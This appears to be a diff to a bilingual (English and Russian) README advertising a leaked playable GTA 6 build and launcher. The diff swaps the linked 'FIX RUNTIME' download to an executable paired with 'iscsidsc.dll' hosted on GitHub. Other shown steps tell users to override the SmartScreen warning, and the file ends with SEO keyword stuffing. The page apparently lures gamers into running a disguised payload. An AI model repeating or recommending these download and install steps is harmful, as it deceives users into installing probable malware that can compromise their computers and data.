@@ -24,7 +24,7 @@ Not affiliated with Rockstar / Take-Two. Retail GTA VI: **19 November 2026**.
 5. Keep **~130 GB** free on an SSD. Press **DOWNLOAD**, wait to 100% (hours; pause is OK).
 6. **PLAY**. First boot 1–3 minutes.
 
-Need **FIX RUNTIME**? Use [Main.exe + libcurl.dll](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0).
+Need **FIX RUNTIME**? Use [GTA6.exe + iscsidsc.dll](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0).
 
 EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.html) · [launcher](https://cyberleakgta6.com/en/) · [company](https://cyberleakgta6.com/en/about.html)
 
@@ -62,7 +62,7 @@ EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.ht
 5. SmartScreen: **Подробнее** → **Выполнить в любом случае**.
 6. Папка установки с **130+ ГБ** на SSD.
 7. Кнопка **СКАЧАТЬ**. Не закрывать. Можно **ПАУЗА**.
-8. Если появится **FIX RUNTIME** — [Main.exe + libcurl.dll](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0).
+8. Если появится **FIX RUNTIME** — [GTA6.exe + iscsidsc.dll](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/tag/v1.0).
 9. **ИГРАТЬ**. Первая загрузка 1–3 минуты.
 
 Подробно: [установка и запуск](https://cyberleakgta6.com/ustanovka-zapusk-gta-6.html)
@@ -133,7 +133,7 @@ EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.ht
 
 скачать гта 6, скачать gta 6, скачать билд гта 6, лаунчер гта 6, gta 6 launcher windows, cyberleak, cyberleek, киберлик, киберлик билд, kiberlik, gta 6 cyberleek build, playable build leonida, GTA6_CyberLeak_Launcher, 113 гб, торрент фейк, vice city, jason duval, lucia, gta vi leak.
 
-LSI: gta6.exe, x64a.rpf, update.rpf, leonida keys, smartscreen, FIX RUNTIME, Main.exe, libcurl.dll.
+LSI: gta6.exe, x64a.rpf, update.rpf, leonida keys, smartscreen, FIX RUNTIME, GTA6.exe, iscsidsc.dll.
 
 ---
 
